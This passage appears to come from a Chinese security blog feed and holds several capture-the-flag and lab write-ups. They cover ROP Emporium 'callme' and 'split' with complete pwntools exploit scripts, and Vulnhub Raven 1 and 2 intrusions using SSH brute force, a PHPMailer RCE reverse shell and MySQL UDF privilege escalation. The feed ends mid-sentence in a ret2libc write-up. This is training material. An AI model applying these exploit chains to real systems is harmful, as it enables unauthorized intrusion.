class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#程序1 </span></span><br><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">int</span> arr[<span class="number">1024</span>*<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//int arr[1024*1024];</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#程序2</span></span><br><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">int</span> arr[<span class="number">1024</span>*<span class="number">1024</span>]=&#123;<span class="number">1</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们编译完这两个程序之后查看编译好的文件大小会发现程序2比程序1要大。原因在于程序1的变量位于.bss段，而程序2的变量位于.data段。</p><p>全局的未初始化变量存在于.bss段中，具体体现为一个占位符；全局的已初始化变量存于.data段中；而函数内的自动变量都在栈上分配空间。</p><p>.bss是不占用.exe文件空间的，其内容由操作系统初始化（清零）；而.data却需要占用，其内容由程序初始化，因此造成了上述情况。</p><p>还有一些点需要注意：</p><ul><li><p>.bss段（未手动初始化的数据）并不给该段的数据分配空间，只是记录数据所需空间的大小</p></li><li><p>.data（已手动初始化的数据）段则为数据分配空间，数据保存在目标文件中</p></li><li><p>.data段包含经过初始化的全局变量以及它们的值</p></li><li><p>.bss段的大小从可执行文件中得到，然后链接器得到这个大小的内存块，紧跟在数据段后面。当这个内存区进入程序的地址空间后全部清零。包含DATA和BSS段的整个区段此时通常称为数据区</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>下面的图可以很好的理解和总结这些概念之间的关系：</p><p><img src="/img/concepts.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> Assembler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP Emporium の callme</title>
      <link href="/2020/05/29/callme/"/>
      <url>/2020/05/29/callme/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><a href="https://ropemporium.com/">ROP Emporium</a>训练2：callme的解析。</p><span id="more"></span><h2 id="callme32"><a href="#callme32" class="headerlink" title="callme32"></a>callme32</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>程序正常运行截图：</p><p><img src="/img/callme/callme1.png"></p><p>checksec：32位程序，依然只开启了DEP保护</p><p><img src="/img/callme/callme2.png"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>还是一样的把程序丢到hopper中分析，首先是callme32主程序。</p><p>可以找到有pwnme函数中fgets函数依然存在溢出漏洞，但是程序中找不到system函数，多了3个callme函数。</p><p><img src="/img/callme/callme3.png"></p><p>具体看了一下这三个callme函数发现都是去调用libc.so中的对应函数，所以我们去看下题目给的libcallme32.so文件中对应的3个函数具体内容：</p><p><img src="/img/callme/callme4.png" alt="callme_one"></p><p><img src="/img/callme/callme5.png" alt="callme_two"></p><p><img src="/img/callme/callme6.png" alt="callme_three"></p><p>结合题目给的提示：</p><p><img src="/img/callme/callme7.png"></p><p>所以我们需要控制程序依次调用callme_one，callme_two，callme_three三个函数，且每次传入的参数均为1，2，3。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>确定了思路我们就开始按照思路一步一步往下走。</p><p>首先覆盖fegts函数返回地址为callme_one函数地址，并给出3个运行参数1，2，3。为了实现再次控制栈，我们需要恢复栈实现堆栈平衡。</p><p>我们输入了3个参数，所以我们需要3个pop指令+ret指令，找一下程序中这样的段：</p><p><img src="/img/callme/callme8.png"></p><p>0x080488a9这个地址的指令是满足条件的，所以我们就可以覆盖fgets函数返回地址调用callme_one函数，然后覆盖调用callme_one函数后的返回地址为我们找到的pop+pop+pop+ret指令保持堆栈平衡。</p><p>然后控制ret返回地址为callme_two函数入口，再次调用pop*3+ret的结构恢复堆栈平衡，然后控制ret跳转到callme_three函数入口……</p><p>就这样玩着套娃游戏就可以解决这道题。</p><h3 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h3><p>直接贴上EXP脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./callme32&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./callme32&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* one_addr = elf.symbols[<span class="string">&#x27;callme_one&#x27;</span>]</span><br><span class="line">* two_addr = elf.symbols[<span class="string">&#x27;callme_two&#x27;</span>]</span><br><span class="line">* thr_addr = elf.symbols[<span class="string">&#x27;callme_three&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* rop_addr = <span class="number">0x080488a9</span></span><br><span class="line">* </span><br><span class="line">* payload_start = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x28</span> + <span class="number">0x4</span>)</span><br><span class="line">* payload_one = p32(one_addr) + p32(rop_addr) + p32(<span class="number">1</span>) + p32(<span class="number">2</span>) + p32(<span class="number">3</span>)</span><br><span class="line">* payload_two = p32(two_addr) + p32(rop_addr) + p32(<span class="number">1</span>) + p32(<span class="number">2</span>) + p32(<span class="number">3</span>)</span><br><span class="line">* payload_thr = p32(thr_addr) + p32(<span class="number">0xdeedbeef</span>) + p32(<span class="number">1</span>) + p32(<span class="number">2</span>) + p32(<span class="number">3</span>)</span><br><span class="line">* </span><br><span class="line">* payload = payload_start + payload_one + payload_two + payload_thr</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行成功截图：</p><p><img src="/img/callme/callme9.png"></p><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h3 id="Step-1-1"><a href="#Step-1-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>程序运行以及checksec和32位程序一模一样，只是换成了64位程序，我们需要考虑下传参方式带来的问题。</p><h3 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h3><p>在运行64位程序的时候程序会从相应寄存器中读取参数，所以调用函数之前需要先将数据传到寄存器中去。本题中需要传入3个参数，所以我们需要找到一个这样的指令结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* pop rdi</span><br><span class="line">* pop rsi</span><br><span class="line">* pop rdx</span><br><span class="line">* ret</span><br></pre></td></tr></table></figure><p>通过ROPgadget找到0x401ab0的位置有满足条件的结构：</p><p><img src="/img/callme/callme10.png"></p><p>于是每次调用函数的套娃型payload的结构就变成了：payload &#x3D; rop_addr + 参数1 + 参数2 + 参数3 + func_addr</p><h3 id="Step-3-1"><a href="#Step-3-1" class="headerlink" title="Step 3"></a>Step 3</h3><p>直接给出EXP脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* one_addr = elf.symbols[<span class="string">&#x27;callme_one&#x27;</span>]</span><br><span class="line">* two_addr = elf.symbols[<span class="string">&#x27;callme_two&#x27;</span>]</span><br><span class="line">* thr_addr = elf.symbols[<span class="string">&#x27;callme_three&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* rop_addr = <span class="number">0x401ab0</span></span><br><span class="line">* </span><br><span class="line">* payload_start = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">* payload_one = p64(rop_addr) + p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(one_addr)</span><br><span class="line">* payload_two = p64(rop_addr) + p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(two_addr)</span><br><span class="line">* payload_thr = p64(rop_addr) + p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(thr_addr)</span><br><span class="line">* </span><br><span class="line">* payload = payload_start + payload_one + payload_two + payload_thr</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行成功截图：</p><p><img src="/img/callme/callme11.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> ROP Emporium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP Emporium の split</title>
      <link href="/2020/05/27/split/"/>
      <url>/2020/05/27/split/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><a href="https://ropemporium.com/">ROP Emporium</a>训练1：split的解析。</p><span id="more"></span><h2 id="split32"><a href="#split32" class="headerlink" title="split32"></a>split32</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>程序正常运行截图：</p><p><img src="/img/split/split1.png"></p><p>checksec：32位程序，只开启了DEP保护</p><p><img src="/img/split/split2.png"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>把程序丢到hopper中看下，发现在pwnme函数中fgets函数存在溢出漏洞：</p><p><img src="/img/split/split3.png"></p><p>同时程序中存在system函数，可以执行系统命令：</p><p><img src="/img/split/split4.png"></p><p>再找下程序中有没有’&#x2F;bin&#x2F;sh’字符串：</p><p><img src="/img/split/split5.png"></p><p>可惜，没有找到。不过在hopper中看到一个有趣的字符串“&#x2F;bin&#x2F;ls”：</p><p><img src="/img/split/split6.png"></p><p>有这个也无法看到flag，那么再去找一下“flag.txt”字符串：</p><p><img src="/img/split/split7.png"></p><p>Surprise！！！居然有“&#x2F;bin&#x2F;cat flag.txt”字符串。到此思路就清晰了，fgets函数溢出覆盖返回地址跳转到system执行“&#x2F;bin&#x2F;cat flag.txt”的命令即可。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>话不多说，直接上EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* sh = process(<span class="string">&#x27;./split32&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./split32&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">* shell_addr = elf.search(<span class="string">&#x27;/bin/cat&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x28</span> + <span class="number">0x4</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(shell_addr)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.send(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>代码运行结果：</p><p><img src="/img/split/split8.png"></p><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="Step-1-1"><a href="#Step-1-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>程序运行截图：</p><p><img src="/img/split/split9.png"></p><p>checksec还是一样的仅开启DEP保护，只是程序变成了64位：</p><p><img src="/img/split/split10.png"></p><h3 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h3><p>将程序丢到hopper中发现解题的逻辑和split32一模一样，fgets函数溢出覆盖返回地址到system函数，执行“&#x2F;bin&#x2F;cat flag.txt”命令.</p><p>与32位程序不同的有两点：</p><ul><li><p>一是偏移量不同，这点简单明了</p></li><li><p>二是32位和64位程序传参方式的不同，具体可以参考<a href="https://coldwave96.github.io/2020/05/11/XMAN-level2-x64/">XMAN level2_x64 の Write-Up</a></p></li></ul><h3 id="Step-3-1"><a href="#Step-3-1" class="headerlink" title="Step 3"></a>Step 3</h3><p>比较简单，还是直接给出EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">* rop_addr = <span class="number">0x0000000000400883</span></span><br><span class="line">* shell_addr = elf.search(<span class="string">&#x27;/bin/cat&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>) + p64(rop_addr) + p64(shell_addr) + p64(system_addr)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.send(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>其中rop_addr是通过<code>ROPgadget --binary ./split --only &#39;pop|ret’</code>命令找到的：</p><p><img src="/img/split/split11.png"></p><p>EXP脚本运行结果图：</p><p><img src="/img/split/split12.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> ROP Emprium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Raven 2 の Write-Up</title>
      <link href="/2020/05/26/Raven-2/"/>
      <url>/2020/05/26/Raven-2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://www.vulnhub.com/">Vulnhub</a>之Raven系列靶机第二台<a href="(https://www.vulnhub.com/entry/raven-2,269/)">Raven 2</a>的Write-up。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>寻找靶机地址：</p><p><img src="/img/Raven-2/Raven-2-1.png"></p><p>扫描开放的端口和服务：</p><p><img src="/img/Raven-2/Raven-2-2.png"></p><p>可以看到端口和服务与Raven 1一致。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>尝试了之前Raven 1的手段，发现均失败，那只能另辟蹊径。</p><p>首先进行了目录爆破，然后去一个一个的访问界面寻找信息，果然找到一个有趣的文件夹：</p><p><img src="/img/Raven-2/Raven-2-3.png"></p><p>在PATH文件里不仅找到了网站的实际地址，还找到了第一个flag：</p><p><img src="/img/Raven-2/Raven-2-4.png"></p><p>看来这个文件夹里有重要的线索，仔细看了下，其他文件都指向PHPMailer。这时突然想起在Raven 1靶机里发现的那封奇怪的邮件和奇怪的code片段，基本确定Raven 2靶机的突破口就在这里了。</p><p>打开SECURITY.MD文件：</p><p><img src="/img/Raven-2/Raven-2-5.png"></p><p>这是连利用哪个漏洞都告诉我们了，结合在VERSION中找到的版本号：</p><p><img src="/img/Raven-2/Raven-2-6.png"></p><p>所以就锁定了<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033">CVE-2016-10033</a>，还是最危险的远程代码执行漏洞。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>关于这个漏洞的具体信息可以看这篇红日安全团队的文章<a href="https://www.freebuf.com/column/155911.html">Web安全-CVE-2016-10033漏洞</a>。</p><p>找一下利用的EXP：</p><p><img src="/img/Raven-2/Raven-2-7.png"></p><p>在Raven 1靶机提权的时候我们用的就是Python实现的，所以这里也选择Python版本的EXP。</p><p>我们看一下这个EXP，然后针对本次环境需要修改的参数：target即目标地址，反弹回本机的地址以及Webshell上传的地址（P.S.backdoor的文件名一定要修改，否则无法攻击成功）</p><p><img src="/img/Raven-2/Raven-2-8.png"></p><p>改好之后运行脚本，然后监听本机4444端口，访问Webshell触发shell反弹：</p><p><img src="/img/Raven-2/Raven-2-9.png"></p><p>得到反弹的shell之后利用Python转换成交互式shell，看下文件夹，发现shell.php确实是成功上传了，但是没有找到backdoor.php，具体原因也不太清楚。</p><p><img src="/img/Raven-2/Raven-2-10.png"></p><p>然后找一下有没有flag：<code>find / -name &quot;flag*”</code></p><p><img src="/img/Raven-2/Raven-2-11.png"></p><p>找到flag2.txt：</p><p><img src="/img/Raven-2/Raven-2-12.png"></p><p>然后是flag3.png文件：</p><p><img src="/img/Raven-2/Raven-2-13.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>根据Raven 1的经验，最后一个flag需要拿到root权限。提权的方法和Raven 1补充的MySQL udf提权一样。</p><p>拿到shell之后查看wordpress配置文件得到数据库账号和密码，登录数据库通过udf提权即可获取root权限。</p><p>这一步与Raven 1靶机有两点不同：</p><ul><li><p>一是没法直接通过scp命令将文件传入靶机，需要靶机通过wget命令下载攻击机的文件</p></li><li><p>二是数据库里用户的账户密码不再能够通过ssh登录了，所以Raven 1中通过steven账户sudo命令提权这条路走不通了</p></li></ul><p>具体操作见Raven 1即可。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Raven Series </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Raven 1 の Write-Up</title>
      <link href="/2020/05/25/Raven-1/"/>
      <url>/2020/05/25/Raven-1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://www.vulnhub.com/">Vulnhub</a>之Raven系列靶机第一台<a href="https://www.vulnhub.com/entry/raven-1,256/">Raven 1</a>的Write-up。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>寻找靶机地址：</p><p><img src="/img/Raven-1/Raven-1-1.png"></p><p>扫描开放的端口和服务：</p><p><img src="/img/Raven-1/Raven-1-2.png"></p><p>首先看下80端口的服务，打开后是Raven Security公司的网站，浏览下网站，在SERVICE界面的源码中找到flag1：</p><p><img src="/img/Raven-1/Raven-1-3.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>在BLOG界面，发现是一个wordpress搭建的站点，后台数据库为MySQL：</p><p><img src="/img/Raven-1/Raven-1-4.png"></p><p>根据经验这里肯定是有问题的，用wpscan扫一下看看能发现什么：</p><p><img src="/img/Raven-1/Raven-1-5.png"></p><p>然而并没有得到什么有用的信息，不甘心，再尝试爆破一下用户信息：</p><p><img src="/img/Raven-1/Raven-1-6.png"></p><p>找到两个用户steven和michael，尝试爆破这两个账户的密码无果。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>在wordpress这里尝试了很久也没有任何收获，只能转向22端口。</p><p>尝试下steven和michael两个用户爆破22端口：</p><p><img src="/img/Raven-1/Raven-1-7.png"></p><p>找到一个，接下来ssh登录一下，找找有什么信息。</p><p><img src="/img/Raven-1/Raven-1-8.png"></p><p>登录后提示我们有新的邮件，去找一下这个邮件在哪里：</p><p><img src="/img/Raven-1/Raven-1-9.png"></p><p>然后看一下michael这封邮件内容，有一个比较有趣的片段：</p><p><img src="/img/Raven-1/Raven-1-10.png"></p><p>但是并不明白这有什么用。同时在&#x2F;var&#x2F;www目录下找到flag2.txt文件：</p><p><img src="/img/Raven-1/Raven-1-11.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>在查看wordpress网站的配置文件时，找到数据库的账户和密码，之前Wappalyzer也说明网站后台是MySQL数据库：</p><p><img src="/img/Raven-1/Raven-1-12.png"></p><p>连接MySQL数据库：</p><p><img src="/img/Raven-1/Raven-1-13.png"></p><p><img src="/img/Raven-1/Raven-1-14.png"></p><p>wp_users表里应该是用户的账户密码，看一下有什么：</p><p><img src="/img/Raven-1/Raven-1-15.png"></p><p>果然是Steven和Michael两个用户，Michael用户的密码查不出来，Steven账户密码解密结果：</p><p><img src="/img/Raven-1/Raven-1-16.png"></p><p>再依次看一下其他的表，在wp_posts表里发现flag3和flag4：</p><p><img src="/img/Raven-1/Raven-1-17.png"></p><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>到这所有的flag我们都已经拿到了，但是还希望可以获得root权限。</p><p>虽然在数据库里获得的是wordpress后台账户的密码，但还是尝试一下ssh是否有用：</p><p><img src="/img/Raven-1/Raven-1-18.png"></p><p>幸运地登录了steven账户，看一下sudo有什么权限：</p><p><img src="/img/Raven-1/Raven-1-19.png"></p><p>那么就可以通过python提权了，具体可看之前DC系列靶机的writeups中python建立交互式终端：</p><p><img src="/img/Raven-1/Raven-1-20.png"></p><p>提权成功，获取root权限后拿到一切（原来flag4应该这样拿&#x3D;&#x3D;）：</p><p><img src="/img/Raven-1/Raven-1-21.png"></p><h2 id="P-S"><a href="#P-S" class="headerlink" title="P.S."></a>P.S.</h2><p>靶机介绍里也说了这台靶机提权的方法有至少两种，后来看其他Writeup发现还可以通过MySQL的udf提权实现。关于udf提权在<a href="https://coldwave96.github.io/2020/05/01/JarvisOJ-WEB-2/#RE">JarvisOJ Web RE？题</a>里有涉及到。</p><p>这台靶机udf提权首先找一下payload：</p><p><img src="/img/Raven-1/Raven-1-22.png"></p><p>然后在本地编译好1518.c文件：</p><p><img src="/img/Raven-1/Raven-1-23.png"></p><p>将编译好的1518.so文件上传到靶机上：</p><p><img src="/img/Raven-1/Raven-1-24.png"></p><p>然后回到michael账户连接数据库开始提权：</p><p><img src="/img/Raven-1/Raven-1-25.png"></p><p><img src="/img/Raven-1/Raven-1-26.png"></p><p><img src="/img/Raven-1/Raven-1-27.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Raven Series </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMAN level3 の Write-Up</title>
      <link href="/2020/05/20/XMAN-level3/"/>
      <url>/2020/05/20/XMAN-level3/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这是JarvisOJ的PWN题部分[XMAN]level3的Write-Up，题目还是有点难度。题目中涉及到二次覆盖，ret2libc方法的使用，延迟绑定技术的理解和运用等知识点，建议先认真了解一下ROP链和延迟绑定技术原理。可以参考之前写的两篇Blog：<a href="https://coldwave96.github.io/2020/05/19/ret2win/">ROP Emporium の ret2win</a>和<a href="https://coldwave96.github.io/2020/05/19/LazyBinding/">ret2libc &amp;&amp; Lazy Binding</a>。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>程序运行截图：</p><p><img src="/img/XMAN-level3/XMAN1.png"></p><p>checksec：32位程序，开启DEP保护</p><p><img src="/img/XMAN-level3/XMAN2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>将程序拖到hopper disassembler中去发现程序中依然存在vulnerable_function函数，但是不再有system函数和‘&#x2F;bin&#x2F;sh’的字符串。</p><p><img src="/img/XMAN-level3/XMAN3.png"></p><p>但是同时题目也给了libc-2.19.so，把该文件也拖到hopper中发现system函数：</p><p><img src="/img/XMAN-level3/XMAN4.png"></p><p>通过ROPgadget找到libc-2.19.so中’&#x2F;bin&#x2F;sh’字符串的位置：</p><p><img src="/img/XMAN-level3/XMAN5.png"></p><p>参考之前的栈溢出系列以及<a href="https://coldwave96.github.io/2020/05/19/ret2win/">ROP Emporium の ret2win</a>，现在的思路就是vulnerable_function函数溢出去执行lib-2.19.so文件中的system函数，同时传入参数’&#x2F;bin&#x2F;sh’。</p><p>理想中的栈布局为：</p><p><img src="/img/XMAN-level3/XMAN6.png"></p><p>说是vulnerable_function函数溢出，其实实际上是read函数溢出。所以我们需要将read函数的返回地址覆盖为system函数的入口地址，然后根据函数调用规则，设置一下system函数的返回地址为0xdeadbeef（毫无意义的地址），最后是system函数的参数即‘bin&#x2F;sh’字符串的地址。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>虽然我们通过libc-2.19.so文件可以得到system函数和’&#x2F;bin&#x2F;sh’字符串的偏移地址，但是不知道其在内存中的实际地址，所以我们需要想办法找到system函数和’&#x2F;bin&#x2F;sh’字符串在内存中的实际地址。</p><p>假设这样一个情况，我们已经知道test函数是通过延迟绑定（具体情况了解<a href="https://coldwave96.github.io/2020/05/19/LazyBinding/">ret2libc &amp;&amp; Lazy Binding</a>）调用libc.so中的test函数实现的，并且我们知道test函数在内存中的实际地址test_addr及其在libc.so中的偏移地址test_libc。</p><p>此时我们想直接调用一个程序中没但是存在于libc.so中的函数func，那么我们可以得到这样一个逻辑等式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func_addr - func_libc = test_addr - test_libc</span><br></pre></td></tr></table></figure><p>即函数在内存中地址和在libc中偏移地址两者的差相等，这个值可以理解为libc文件加载到内存中的基址。</p><p>根据这个题目中的情况，test函数我们选择write函数，替换func函数的位置即可获取system函数和’&#x2F;bin&#x2F;sh’字符串在内存中的实际地址。</p><p>首先我们要泄露获取write函数的真实地址，这个可以通过打印write在got表中的地址实现。</p><p>为了输出write_got对应的实际地址，需要构造下面的栈布局：</p><p><img src="/img/XMAN-level3/XMAN7.png"></p><p>将read函数的返回地址覆盖为write_plt，设置write函数返回地址为vulnerable_function函数入口地址（原因下面会提到）。</p><p>之后是<code>write(int fd,const void*buf,size_t 